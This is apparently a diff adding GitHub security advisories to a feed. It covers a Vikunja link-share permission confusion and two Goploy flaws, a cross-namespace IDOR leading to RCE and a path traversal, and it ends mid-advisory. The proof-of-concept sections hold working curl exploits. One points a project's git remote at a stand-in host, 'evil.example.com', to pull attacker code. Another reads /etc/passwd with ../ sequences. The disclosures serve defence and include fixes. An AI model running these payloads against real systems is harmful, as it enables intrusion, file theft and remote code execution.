+<li><a href="https://github.com/go-vikunja/vikunja/commit/46ae98355462acbea451356326146675d3feeaab">https://github.com/go-vikunja/vikunja/commit/46ae98355462acbea451356326146675d3feeaab</a></li>
+<li><a href="https://github.com/go-vikunja/vikunja/releases/tag/v2.7.0">https://github.com/go-vikunja/vikunja/releases/tag/v2.7.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-4hv6-xc92-j86g">https://github.com/advisories/GHSA-4hv6-xc92-j86g</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4hv6-xc92-j86g</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-10-09T20:57:34.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[code.vikunja.io/api] Vikunja: Link-share principal-type confusion enables cross-account team removal, bot takeover, and roster disclosure]]></title>
+        <id>https://github.com/advisories/GHSA-32r8-5843-4qw2</id>
+        <link href="https://github.com/advisories/GHSA-32r8-5843-4qw2"/>
+        <updated>2026-10-27T15:18:35.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Vikunja's <code>web.Auth</code> interface (<code>pkg/web/web.go</code>, single method <code>GetID() int64</code>) is satisfied by BOTH <code>*user.User</code> and <code>*models.LinkSharing</code>. A link-share's <code>GetID()</code> returns the <strong>raw positive</strong> <code>share.ID</code> (<code>pkg/models/link_sharing.go:83-85</code>), which lives in the same positive autoincrement ID space as <code>users.id</code>. The safe negated form <code>getUserID() = share.ID * -1</code> (<code>link_sharing.go:126-128</code>) exists but is NOT used at three permission sinks. As a result, a link-share principal with id <code>N</code> — which should have zero authority over teams or bot users — is treated as the <em>user</em> whose <code>users.id == N</code> at three permission checks that lack the <code>a.(*LinkSharing)</code> guard their sibling methods have. This is the same principal-type-confusion class as CVE-2026-68581 (GHSA-vvcv-vpph-h844), but at three code paths that advisory/fix never touched.</p>
+<h2 id="root-cause">Root Cause</h2>
+<p><code>web.Auth</code> is a one-method interface (<code>GetID() int64</code>). <code>*LinkSharing.GetID()</code> returns the raw positive share id. Three permission methods compare this raw id directly and omit the link-share type guard used elsewhere in the same files:</p>
+<ol>
+<li><strong><code>TeamMember.CanDelete</code></strong> (<code>pkg/models/team_members_permissions.go:31-40</code>): the self-removal fast path <code>if u.ID == a.GetID() { return true }</code> (:36) executes <strong>before</strong> <code>IsAdmin</code>. <code>IsAdmin</code> (:48-51) is the ONLY place that rejects link shares (<code>if _, is := a.(*LinkSharing); is { return false }</code>, :50) — and it is never reached when the fast path returns true.</li>
+<li><strong><code>BotUser.isOwner</code></strong> (<code>pkg/models/bot_users_permissions.go:47-56</code>): <code>return u.BotOwnerID == a.GetID()</code> (:55), used by <code>CanRead</code>/<code>CanUpdate</code>/<code>CanDelete</code> (:36-45). Unlike <code>CanCreate</code> (:27-30) which type-asserts <code>a.(*user.User)</code>, these three paths have no principal guard.</li>
+<li><strong><code>Team.CanRead</code></strong> (<code>pkg/models/teams_permissions.go:68-78</code>): matches membership on <code>And("user_id = ?", a.GetID())</code> (:76) with no link-share guard, unlike sibling <code>IsAdmin</code> (:45-49, guard at :47).</li>
+</ol>
+<p>Link-share JWTs reach these routes: <code>SetupTokenMiddleware</code> validates the signature only, <code>GetAuthFromClaims</code> returns <code>*models.LinkSharing</code>, and the <code>/user</code>/<code>/teams</code> route groups add no link-share rejection. Link sharing is enabled by default (<code>config.go</code> <code>ServiceEnableLinkSharing.setDefault(true)</code>).</p>
+<h2 id="impact">Impact</h2>
+<p>A link-share principal (obtainable from any public share link, or self-registered via a share on the attacker's own project) whose id <code>N</code> collides with a victim's <code>users.id == N</code> can, without being that user or any user:</p>
+<ul>
+<li><strong>Integrity (I:H):</strong> remove the victim from any team they belong to (<code>DELETE /api/v1/teams/{T}/members/{username}</code>) → revokes all project permissions the victim inherited through that team.</li>
+<li><strong>Availability/Integrity (A:H, I:H):</strong> enumerate the victim's bot users (<code>GET /api/v1/user/bots</code> → <code>bot_owner_id = a.GetID()</code>), then disable/rename or <strong>permanently delete</strong> them (<code>DELETE /api/v1/user/bots/{id}</code> → <code>DeleteUser</code>), destroying data owned solely by those bots.</li>
+<li><strong>Confidentiality (C:H):</strong> read the roster + metadata (name, description, full member list) of any team the colliding user belongs to (<code>GET /api/v1/teams/{T}</code>), plus read bot-user records via <code>isOwner</code>-gated reads.</li>
+</ul>
+<h2 id="attack-chain">Attack Chain</h2>
+<h3 id="sink-1--teammembercandelete-integrity">Sink 1 — TeamMember.CanDelete (integrity)</h3>
+<ol>
+<li><strong>Entry:</strong> <code>POST /api/v1/shares/{hash}/auth</code> → link-share JWT with <code>id = N</code>. <strong>Guard:</strong> JWT middleware — signature only. <strong>Bypass proof:</strong> <code>GetAuthFromClaims</code> returns <code>*models.LinkSharing</code>; no route-group link-share rejection on the <code>/teams</code> group.</li>
+<li><strong>Action:</strong> <code>DELETE /api/v1/teams/{T}/members/{usernameOfUserN}</code> with the link-share bearer, targeting a team <code>T</code> (≥2 members) that user <code>N</code> belongs to. <strong>Guard:</strong> <code>CanDelete</code> → <code>GetUserByUsername(tm.Username)</code> returns user N, then <code>u.ID == a.GetID()</code> (<code>team_members_permissions.go:36</code>). <strong>Bypass proof:</strong> <code>a.GetID()</code> returns <code>N</code> (raw positive <code>share.ID</code>, <code>link_sharing.go:84</code>) == user N's id → <code>true</code>. No <code>a.(*LinkSharing)</code> check on this branch (only <code>IsAdmin</code> at :50 has it, never reached).</li>
+<li><strong>Sink:</strong> <code>Delete</code> (<code>team_members.go</code>) removes user N from team T (last-member check passes when team has ≥2 members). <strong>Impact:</strong> victim loses all project access inherited through team T.</li>
+</ol>
+<h3 id="sink-2--botuserisowner-bot-takeover--destruction">Sink 2 — BotUser.isOwner (bot takeover / destruction)</h3>
+<ol>
+<li><strong>Entry:</strong> link-share JWT id N (as above). <strong>Guard:</strong> signature-only; <code>/user</code> group adds no link-share reject.</li>
+<li><strong>Enumerate:</strong> <code>GET /api/v1/user/bots</code> → <code>ReadAll</code> runs <code>Where("bot_owner_id = ?", a.GetID())</code> = bots owned by user N. <strong>Bypass proof:</strong> <code>a.GetID()</code> = N; returns victim's bot ids self-contained (removes the id-guessing barrier).</li>
+<li><strong>Sink:</strong> <code>DELETE /api/v1/user/bots/{botId}</code> → <code>CanDelete</code> → <code>isOwner</code> → <code>u.BotOwnerID == a.GetID()</code> (<code>bot_users_permissions.go:55</code>) → true; <code>Delete</code> calls <code>DeleteUser</code>. <strong>Bypass proof:</strong> no <code>a.(*LinkSharing)</code> guard here (Create-only, :28). <strong>Impact:</strong> disable/rename/permanently delete victim's bot automation identities.</li>
+</ol>
+<h3 id="sink-3--teamcanread-info-disclosure">Sink 3 — Team.CanRead (info disclosure)</h3>
+<ol>
+<li><strong>Entry:</strong> link-share JWT id N. <strong>Guard:</strong> signature-only; no reject on <code>GET /teams/:team</code>.</li>
+<li><strong>Sink:</strong> <code>GET /api/v1/teams/{T}</code> → <code>CanRead</code> runs <code>Where("team_id=?", t.ID).And("user_id=?", a.GetID()).Get(tm)</code> (<code>teams_permissions.go:74-77</code>). <strong>Bypass proof:</strong> <code>a.GetID()</code> = N matches user N's <code>team_members</code> row → <code>can = true</code>; no <code>a.(*LinkSharing)</code> check (contrast <code>IsAdmin</code> at :47). <strong>Impact:</strong> read roster + metadata of a team the link share is not part of.</li>
+</ol>
+<h2 id="bypass-evidence">Bypass Evidence</h2>
+<ul>
+<li><code>link_sharing.go:83-85</code> <code>GetID()</code> returns raw positive <code>share.ID</code> (NOT the negated <code>getUserID()</code> at :126-128).</li>
+<li><code>team_members_permissions.go:36</code> raw <code>u.ID == a.GetID()</code> before <code>IsAdmin</code>; the LinkSharing guard sits at :50 on a branch never reached when the fast path returns true.</li>
+<li><code>bot_users_permissions.go:55</code> raw <code>u.BotOwnerID == a.GetID()</code>; the <code>a.(*user.User)</code> guard at :28 is Create-only and NOT replicated on <code>isOwner</code>.</li>
+<li><code>teams_permissions.go:76</code> raw <code>a.GetID()</code> in <code>CanRead</code>; sibling <code>IsAdmin</code> has the guard at :47, <code>CanRead</code> omits it.</li>
+<li>All three sinks verified present on latest release tag <code>v2.4.0</code> (<code>git show v2.4.0:&lt;file&gt;</code>). No fix commits touch these files between v2.4.0 and HEAD (the only post-tag commit to link_sharing.go, <code>c580d51</code>, merely shadows an embedded Update method).</li>
+</ul>
+<h2 id="affected-versions">Affected Versions</h2>
+<p><code>&lt;= 2.4.0</code> (latest release; also present on HEAD of <code>main</code>). Requires default-enabled link sharing.</p>
+<h2 id="exploitability-constraint-reflected-in-ach">Exploitability Constraint (reflected in AC:H)</h2>
+<p>The attacker cannot freely choose the colliding id — <code>link_shares.id</code> is autoincrement. Exploitation is (a) <em>opportunistic</em> (a guest holding a share with id N attacks the user whose <code>users.id == N</code>) or (b) <em>targeted</em> (self-register and walk the autoincrement toward a chosen id; low-numbered shares collide with low-numbered/early/admin accounts). This is the identical constraint the accepted CVE-2026-68581 had; it affects target selection (AC), not reachability of the boundary crossing.</p>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<p>Add the link-share principal guard (<code>if _, is := a.(*LinkSharing); is { return false }</code>) — which <code>IsAdmin</code>/<code>CanCreate</code> already use — to all three sinks: the <code>TeamMember.CanDelete</code> self-removal fast path (before the <code>u.ID == a.GetID()</code> check), <code>BotUser.isOwner</code>, and <code>Team.CanRead</code>. Alternatively, resolve principals through <code>getUserID()</code> (negated id space) at every permission check so link-share ids can never collide with user ids.</p>
+<hr>
+<p>Reported by <strong>zx (Jace)</strong> — GitHub: @manus-use</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/go-vikunja/vikunja/security/advisories/GHSA-32r8-5843-4qw2">https://github.com/go-vikunja/vikunja/security/advisories/GHSA-32r8-5843-4qw2</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-76216">https://nvd.nist.gov/vuln/detail/CVE-2026-76216</a></li>
+<li><a href="https://www.vulncheck.com/advisories/vikunja-through-principal-type-confusion-via-linksharing">https://www.vulncheck.com/advisories/vikunja-through-principal-type-confusion-via-linksharing</a></li>
+<li><a href="https://github.com/go-vikunja/vikunja/commit/a717d64d5658708ba390f18dd697f5e567e68aac">https://github.com/go-vikunja/vikunja/commit/a717d64d5658708ba390f18dd697f5e567e68aac</a></li>
+<li><a href="https://github.com/go-vikunja/vikunja/releases/tag/v2.5.0">https://github.com/go-vikunja/vikunja/releases/tag/v2.5.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-32r8-5843-4qw2">https://github.com/advisories/GHSA-32r8-5843-4qw2</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-32r8-5843-4qw2</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-10-09T20:43:40.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/zhenorzz/goploy] Goploy: Cross-namespace IDOR and RCE via body-supplied row id in project and project_file handlers]]></title>
+        <id>https://github.com/advisories/GHSA-26rh-24rg-j3vv</id>
+        <link href="https://github.com/advisories/GHSA-26rh-24rg-j3vv"/>
+        <updated>2026-10-27T15:13:03.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>Project.AddFile</code>, <code>Project.EditFile</code>, <code>Project.RemoveFile</code>, and <code>Project.Edit</code> in <code>cmd/server/api/project/handler.go</code> accept a project or project-file row id from the JSON body and act on it without checking that the project belongs to the caller's namespace. The corresponding <code>model.ProjectFile.GetData</code> and <code>model.Project.GetData</code> queries filter only by row id. A user holding the <code>manager</code> role (or any role that includes the <code>FileSync</code> / <code>EditProject</code> permission) in their own namespace can read, write, or delete files in any project across the install, and can rewrite any project's git remote URL by submitting the foreign id in the body. The git-URL primitive escalates to RCE on the next deploy because <code>Edit</code> runs <code>git remote set-url</code> on the project's working tree.</p>
+<h3 id="affected">Affected</h3>
+<p><code>zhenorzz/goploy</code> <code>develop</code> HEAD as of 2026-05-27. Verified against the <code>zhenorzz/goploy:1.17.5</code> Docker image (<code>docker.io/zhenorzz/goploy@sha256:69d08e1d16d7a7167426c89456c4bcef8e077a16554a4067ff258fff26d5cd44</code>).</p>
+<p>The four handlers and the model lookups have been in this shape across the file API and project metadata API.</p>
+<h3 id="vulnerable-code">Vulnerable code</h3>
+<p><code>cmd/server/api/project/handler.go::AddFile</code> (creates file under any project's directory; body controls <code>projectId</code>):</p>
+<pre><code class="language-go">func (Project) AddFile(gp *server.Goploy) server.Response {
+    type ReqData struct {
+        ProjectID int64  `json:"projectId" validate:"required,gt=0"`
+        Content   string `json:"content" validate:"required"`
+        Filename  string `json:"filename" validate:"required"`
+    }
+    var reqData ReqData
+    if err := gp.Decode(&amp;reqData); err != nil { ... }
+
+    filePath := path.Join(config.GetProjectFilePath(reqData.ProjectID), reqData.Filename)
+    // ... os.Create(filePath); file.WriteString(reqData.Content)
+    id, err := model.ProjectFile{ProjectID: reqData.ProjectID, Filename: reqData.Filename}.AddRow()
+}
+</code></pre>
+<p><code>cmd/server/api/project/handler.go::EditFile</code> (overwrites file content; body controls file id, server derives project from the file row):</p>
+<pre><code class="language-go">func (Project) EditFile(gp *server.Goploy) server.Response {
+    type ReqData struct {
+        ID      int64  `json:"id" validate:"required,gt=0"`
+        Content string `json:"content" validate:"required"`
+    }
+    var reqData ReqData
+    if err := gp.Decode(&amp;reqData); err != nil { ... }
+
+    projectFileData, err := model.ProjectFile{ID: reqData.ID}.GetData()
+    // ... os.Create(path.Join(config.GetProjectFilePath(projectFileData.ProjectID), projectFileData.Filename))
+    file.WriteString(reqData.Content)
+}
+</code></pre>
+<p><code>cmd/server/api/project/handler.go::RemoveFile</code> (deletes file row + on-disk file by body id):</p>
+<pre><code class="language-go">func (Project) RemoveFile(gp *server.Goploy) server.Response {
+    type ReqData struct {
+        ProjectFileID int64 `json:"projectFileId" validate:"required,gt=0"`
+    }
+    var reqData ReqData
+    if err := gp.Decode(&amp;reqData); err != nil { ... }
+    projectFileData, err := model.ProjectFile{ID: reqData.ProjectFileID}.GetData()
+    if err := os.Remove(path.Join(config.GetProjectFilePath(projectFileData.ProjectID), projectFileData.Filename)); err != nil { ... }
+}
+</code></pre>
+<p><code>cmd/server/api/project/handler.go::Edit</code> (updates any project's metadata; on URL change runs <code>git remote set-url</code> in the project working tree):</p>
+<pre><code class="language-go">func (Project) Edit(gp *server.Goploy) server.Response {
+    // ... ReqData has ID, Name, URL, Branch, Script, etc.
+    projectData, err := model.Project{ID: reqData.ID}.GetData()
+    model.Project{ID: reqData.ID, Name: reqData.Name, URL: reqData.URL, ...}.EditRow()
+    if reqData.URL != projectData.URL {
+        srcPath := config.GetProjectPath(projectData.ID)
+        cmd := exec.Command("git", "remote", "set-url", "origin", reqData.URL)
+        cmd.Dir = srcPath
+    }
+}
+</code></pre>
+<p><code>internal/model/project_file.go::ProjectFile.GetData</code> filters only by row id, no namespace join:</p>
+<pre><code class="language-go">func (pf ProjectFile) GetData() (ProjectFile, error) {
+    err := sq.
+        Select("id, project_id, filename, insert_time, update_time").
+        From(projectFileTable).
+        Where(sq.Eq{"id": pf.ID}).
+        ...
+}
+</code></pre>
+<p><code>internal/server/route.go::Route.hasPermission</code> checks only namespace-level permission ids; nothing in the request flow verifies that the body-supplied project id belongs to <code>gp.Namespace.ID</code>:</p>
+<pre><code class="language-go">func (r Route) hasPermission(permissionIDs map[int64]struct{}) error {
+    if len(r.permissionIDs) == 0 { return nil }
+    for _, permissionID := range r.permissionIDs {
+        if _, ok := permissionIDs[permissionID]; ok { return nil }
+    }
+    return errors.New("no permission")
+}
+</code></pre>
+<h3 id="reachable">Reachable</h3>
+<p>Any logged-in user assigned the <code>manager</code> role in their own namespace can call <code>/project/addFile</code>, <code>/project/editFile</code>, <code>/project/removeFile</code>, and <code>/project/edit</code>. The seeded <code>manager</code> role (<code>role.id = 1</code>) is granted both <code>FileSync</code> (<code>permission.id = 68</code>) and <code>EditProject</code> (<code>permission.id = 17</code>) by <code>database/goploy.sql</code>. Multi-tenant deployments typically assign <code>manager</code> to each tenant's project owner; once a tenant's manager holds these permissions in their own namespace, they hold them globally for these four endpoints.</p>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p>Setup against the published Docker image:</p>
+<pre><code class="language-bash">docker network create goploy-net
+docker run -d --name goploy-mysql --network goploy-net \
+    -e MYSQL_ROOT_PASSWORD=goploy123 -e MYSQL_DATABASE=goploy \
+    mysql:8.0 --default-authentication-plugin=mysql_native_password
+
+# Wait for MySQL, then load schema
+docker cp database/goploy.sql goploy-mysql:/tmp/goploy.sql
+docker exec goploy-mysql sh -c 'mysql -uroot -pgoploy123 goploy &lt; /tmp/goploy.sql'
+
+# Mount goploy.toml pointing DB at goploy-mysql:3306
+docker run -d --name goploy-app --network goploy-net -p 18080:80 \
+    -v $PWD/repo:/opt/goploy/repository \
+    zhenorzz/goploy:1.17.5
+</code></pre>
+<p>Set up two namespaces and two non-super-manager users, each assigned <code>manager</code> (role_id=1) only in their own namespace:</p>
+<pre><code class="language-bash"># Admin login (default account admin / admin!@# requires first-login change)
+curl -s -c /tmp/admin.jar -X POST http://localhost:18080/user/login \
+    -H 'Content-Type: application/json' \
+    -d '{"account":"admin","password":"admin!@#","newPassword":"Admin!@#2026"}'
+
+ADMIN_HDR='-b /tmp/admin.jar -H G-N-ID:1 -H Content-Type:application/json'
+
+# Create NS_B
+curl -s $ADMIN_HDR -X POST http://localhost:18080/namespace/add -d '{"name":"ns_b"}'
+# → {"data":{"id":2}}
+
+# Create alice (id=2) and bob (id=3)
+curl -s $ADMIN_HDR -X POST http://localhost:18080/user/add \
+    -d '{"account":"alice","password":"Alice!@#2026","name":"Alice","contact":"","superManager":0}'
+curl -s $ADMIN_HDR -X POST http://localhost:18080/user/add \
+    -d '{"account":"bob","password":"Bob!@#2026","name":"Bob","contact":"","superManager":0}'
+
+# Assign alice → NS_A (id=1), bob → NS_B (id=2), both as manager (role_id=1)
+curl -s $ADMIN_HDR -X POST http://localhost:18080/namespace/addUser \
+    -d '{"namespaceId":1,"userIds":[2],"roleId":1}'
+curl -s $ADMIN_HDR -X POST http://localhost:18080/namespace/addUser \
+    -d '{"namespaceId":2,"userIds":[3],"roleId":1}'
+
+# As admin in NS_A, create project alice-prod (id=1) with file alice-secrets.yml (id=1)
+curl -s $ADMIN_HDR -X POST http://localhost:18080/project/add \
+    -d '{"name":"alice-prod","repoType":"git","url":"https://github.com/zhenorzz/goploy.git",
+         "path":"/tmp/deploy/alice","environment":1,"branch":"master","transferType":"rsync",
+         "transferOption":"-rtv","deployServerMode":"serial",
+         "script":{"afterPull":{"mode":"","content":""},"afterDeploy":{"mode":"","content":""},
+                   "deployFinish":{"mode":"","content":""}}}'
+curl -s $ADMIN_HDR -X POST http://localhost:18080/project/addFile \
+    -d '{"projectId":1,"filename":"alice-secrets.yml","content":"# Alice secret\napi_key: ALICE_API_KEY_2026\n"}'
+
+# Bob logs in (first-login change)
+curl -s -c /tmp/bob.jar -X POST http://localhost:18080/user/login \
+    -H 'Content-Type: application/json' \
+    -d '{"account":"bob","password":"Bob!@#2026","newPassword":"BobBob!@#2026"}'
+
+BOB_HDR='-b /tmp/bob.jar -H G-N-ID:2 -H Content-Type:application/json'
+</code></pre>
+<p>Negative control: Bob's own namespace has no projects.</p>
+<pre><code class="language-bash">curl -s $BOB_HDR "http://localhost:18080/project/getList?page=1&amp;rows=100"
+# → {"code":0,"data":{"list":[]}}
+</code></pre>
+<p>Exploit 1 — Bob overwrites Alice's file content:</p>
+<pre><code class="language-bash">curl -s $BOB_HDR -X PUT http://localhost:18080/project/editFile \
+    -d '{"id":1,"content":"OWNED BY BOB\nattacker_namespace: ns_b\n"}'
+# → {"code":0,"message":"","data":null}
+
+docker exec goploy-app cat /opt/goploy/repository/repository/project-file/project_1/alice-secrets.yml
+# OWNED BY BOB
+# attacker_namespace: ns_b
+</code></pre>
+<p>Exploit 2 — Bob plants a new file in Alice's project directory:</p>
+<pre><code class="language-bash">curl -s $BOB_HDR -X POST http://localhost:18080/project/addFile \
+    -d '{"projectId":1,"filename":".env.attacker","content":"PWN=bob_from_ns_b"}'
+# → {"code":0,"message":"","data":{"id":2}}
+
+docker exec goploy-app ls /opt/goploy/repository/repository/project-file/project_1/
+# .env.attacker   alice-secrets.yml
+</code></pre>
+<p>Exploit 3 — Bob deletes Alice's file:</p>
+<pre><code class="language-bash">curl -s $BOB_HDR -X DELETE http://localhost:18080/project/removeFile \
+    -d '{"projectFileId":1}'
+# → {"code":0,"message":"","data":null}
+# alice-secrets.yml is gone from project_1/.
+</code></pre>
+<p>Exploit 4 — Bob rewrites Alice's project git remote URL. On the next deploy, goploy runs <code>git -C &lt;alice-prod-tree&gt; remote set-url origin &lt;attacker-url&gt;</code> and clones / pulls attacker code, leading to RCE under goploy's user:</p>
+<pre><code class="language-bash">curl -s $BOB_HDR -X PUT http://localhost:18080/project/edit \
+    -d '{"id":1,"name":"alice-prod","repoType":"git",
+         "url":"git@evil.example.com:attacker/payload.git",
+         "path":"/tmp/deploy/alice","environment":1,"branch":"master",
+         "transferType":"rsync","transferOption":"-rtv","deployServerMode":"serial",
+         "script":{"afterPull":{"mode":"","content":""},"afterDeploy":{"mode":"","content":""},
+                   "deployFinish":{"mode":"","content":""}}}'
+# → {"code":0,"message":"","data":null}
+
+docker exec goploy-mysql mysql -uroot -pgoploy123 goploy \
+    -e "SELECT name,url FROM project WHERE id=1;"
+# alice-prod | git@evil.example.com:attacker/payload.git
+</code></pre>
+<p>Positive control: Bob editing a file in his own namespace (after creating one) goes through the same code path and succeeds normally — the patch must keep that working.</p>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>Add a namespace-scoped variant of <code>GetData</code> so the model layer requires <code>(id, namespace_id)</code> and switch the four handlers over.</p>
+<p><code>internal/model/project_file.go</code>:</p>
+<pre><code class="language-go">func (pf ProjectFile) GetDataInNamespace(namespaceID int64) (ProjectFile, error) {
+    var projectFile ProjectFile
+    err := sq.
+        Select("pf.id, pf.project_id, pf.filename, pf.insert_time, pf.update_time").
+        From(projectFileTable + " pf").
+        Join("project p ON p.id = pf.project_id").
+        Where(sq.Eq{"pf.id": pf.ID, "p.namespace_id": namespaceID}).
+        RunWith(DB).
+        QueryRow().
+        Scan(&amp;projectFile.ID, &amp;projectFile.ProjectID, &amp;projectFile.Filename,
+             &amp;projectFile.InsertTime, &amp;projectFile.UpdateTime)
+    return projectFile, err
+}
+</code></pre>
+<p><code>internal/model/project.go</code>: add a parallel <code>Project.GetDataInNamespace</code> that joins on <code>namespace_id</code>.</p>
+<p><code>cmd/server/api/project/handler.go</code>:</p>
+<ul>
+<li><code>EditFile</code> and <code>RemoveFile</code> switch to <code>model.ProjectFile{ID: ...}.GetDataInNamespace(gp.Namespace.ID)</code>.</li>
+<li><code>AddFile</code> calls a new <code>model.Project{ID: reqData.ProjectID}.GetDataInNamespace(gp.Namespace.ID)</code> precheck before <code>os.Create</code> and <code>AddRow</code>.</li>
+<li><code>Edit</code> calls <code>model.Project{ID: reqData.ID}.GetDataInNamespace(gp.Namespace.ID)</code> before <code>EditRow</code>.</li>
+</ul>
+<p><code>sql.ErrNoRows</code> from the namespace-scoped lookup becomes the correct denial for any cross-namespace id. The same pattern should be applied to other body-id consumers in this file (<code>Remove</code>, <code>SetAutoDeploy</code>, <code>UploadFile</code>, <code>AddTask</code>, <code>EditProcess</code>, etc.) but the four endpoints above are the immediately exploitable ones.</p>
+<h3 id="patch">Patch</h3>
+<p>Fix proposed in <a href="https://github.com/zhenorzz/goploy-ghsa-26rh-24rg-j3vv/pull/1">https://github.com/zhenorzz/goploy-ghsa-26rh-24rg-j3vv/pull/1</a>. The PR diff adds the namespace-scoped model variants and switches the four exposed handlers to use them.</p>
+<h3 id="credit">Credit</h3>
+<p>Reported by tonghuaroot.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/zhenorzz/goploy/security/advisories/GHSA-26rh-24rg-j3vv">https://github.com/zhenorzz/goploy/security/advisories/GHSA-26rh-24rg-j3vv</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53552">https://nvd.nist.gov/vuln/detail/CVE-2026-53552</a></li>
+<li><a href="https://github.com/zhenorzz/goploy/commit/b49eabe903c7d7df1a3763385f5067676da4fdd3">https://github.com/zhenorzz/goploy/commit/b49eabe903c7d7df1a3763385f5067676da4fdd3</a></li>
+<li><a href="https://github.com/zhenorzz/goploy/releases/tag/v1.18.0">https://github.com/zhenorzz/goploy/releases/tag/v1.18.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-26rh-24rg-j3vv">https://github.com/advisories/GHSA-26rh-24rg-j3vv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-26rh-24rg-j3vv</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-07-07T23:42:12.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/zhenorzz/goploy] Goploy: Arbitrary File Read via Path Traversal in /deploy/fileDiff allows Remote Server Compromise]]></title>
+        <id>https://github.com/advisories/GHSA-4g5x-hcwm-82jw</id>
+        <link href="https://github.com/advisories/GHSA-4g5x-hcwm-82jw"/>
+        <updated>2026-10-27T15:11:48.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="goploy-system-arbitrary-file-read-vulnerability">Goploy System Arbitrary File Read Vulnerability</h1>
+<h2 id="basic-information">Basic Information</h2>
+<ul>
+<li><strong>Vulnerability Name</strong>: Goploy Endpoints Arbitrary File Read via Path Traversal</li>
+<li><strong>Affected Product</strong>: Goploy</li>
+<li><strong>Known Affected Versions</strong>: &lt;=1.17.5</li>
+</ul>
+<h2 id="vulnerability-description">Vulnerability Description</h2>
+<p>Goploy is an open-source automation deployment system. A severe path traversal vulnerability exists in its backend API endpoints, specifically <code>/deploy/fileDiff</code> (File Compare), when handling file paths provided by the client.</p>
+<p>The original logic of this endpoint is to read a local project file and compare it with a file on a remote target server. However, due to insufficient validation and sanitization of the <code>filePath</code> parameter, and the lack of security constraints on the final absolute file path, malicious paths containing <code>../</code> are directly executed within the system.</p>
+<p>This leads to a <strong>dual arbitrary file read</strong> issue:</p>
+<ol>
+<li><strong>Local Host File Read</strong>: <code>os.ReadFile</code> is tricked by the directory traversal payload to read any file via its absolute path on the Goploy local host (returned in the <code>srcText</code> field of the response body).</li>
+<li><strong>Remote Controlled Server File Read</strong>: Subsequently, the same payload is utilized via the SFTP protocol on the target server pointed to by the <code>serverID</code>. Influenced similarly by the directory traversal, it reads any file on the configured remote server (returned in the <code>distText</code> field of the response body).</li>
+</ol>
+<p><strong>The threshold for exploiting this vulnerability is extremely low, and the conditions are very easily met.</strong> The system comes with a built-in <code>member</code> role upon default installation, which is <strong>granted the "File Compare" permission by default</strong>. This means that as long as a normal low-privileged user is added to the system, they inherently possess the basic privileges required to call the vulnerable endpoint. The only prerequisite for the attack is that at least one project and one associated server are configured in the system.</p>
+<p>An attacker only needs to specify the correct namespace header (e.g., <code>G-N-ID: 1</code>) via a packet capture tool to bypass simple restrictions. By enumerating available <code>serverId</code> parameters, the attacker can successfully execute path traversal via this endpoint, reading arbitrary files on both the local Goploy host and <strong>all remote target servers managed by Goploy</strong>.</p>
+<h2 id="steps-to-reproduce-proof-of-concept">Steps to Reproduce (Proof of Concept)</h2>
+<h3 id="theoretical-steps-see-concrete-steps-below">Theoretical Steps (See concrete steps below)</h3>
+<ol>
+<li><p><strong>Obtain Normal User Privileges</strong>
+Log in to the system using any registered low-privileged account to obtain valid authentication credentials (Cookie/Token) and its corresponding authorized Namespace ID.</p>
+</li>
+<li><p><strong>Construct Malicious Request</strong>
+Send a POST request containing the directory traversal characters <code>../</code> to the target endpoint <code>/deploy/fileDiff</code>, while including the <code>G-N-ID</code> header.</p>
+<p><strong>PoC Example (Reading <code>/etc/passwd</code> and enumerating <code>serverId</code>):</strong></p>
+<pre><code class="language-bash">curl -s -X POST -b "goploy_token=&lt;valid_cookie&gt;" \
+     -H "Content-Type: application/json" \
+     -H "G-N-ID: 1" \
+     -d '{"projectId":1,"serverId":1,"filePath":"../../../../../../../../../../etc/passwd"}' \
+     "http://&lt;target-host&gt;/deploy/fileDiff"
+</code></pre>
+</li>
+<li><p><strong>Reproduction Result</strong>
+The server will return the complete contents of the <code>/etc/passwd</code> file from both the host and the remote server.</p>
+</li>
+</ol>
+<h3 id="concrete-steps">Concrete Steps</h3>
+<ol>
+<li><p><strong>Environment Setup</strong>
+ Published an arbitrary project using the super admin account:</p>
+ <img width="1919" height="428" alt="image" src="https://github.com/user-attachments/assets/8618a038-9088-45b4-804a-5541e243c6a8">
+
+
+<p> Configured two managed remote servers:</p>
+ <img width="1896" height="399" alt="image-1(1)" src="https://github.com/user-attachments/assets/89cfa086-d20b-448e-9cf7-1af5798e3cfe">
+
+<p> Created a normal user and assigned the <code>member</code> role (which includes File Compare permission):</p>
+ <img width="1910" height="343" alt="image-2" src="https://github.com/user-attachments/assets/b8dda364-c23d-4496-a555-ff477c511d31">
+
+ 
+ <img width="951" height="364" alt="image-3" src="https://github.com/user-attachments/assets/0e20cbed-7341-484c-b0a7-0fcd6ca2fea6">
+
+</li>
+<li><p><strong>Obtain Normal User Privileges</strong>
+ Log in to the system using the registered <code>test</code> account to obtain valid authentication credentials (Cookie/Token).</p>
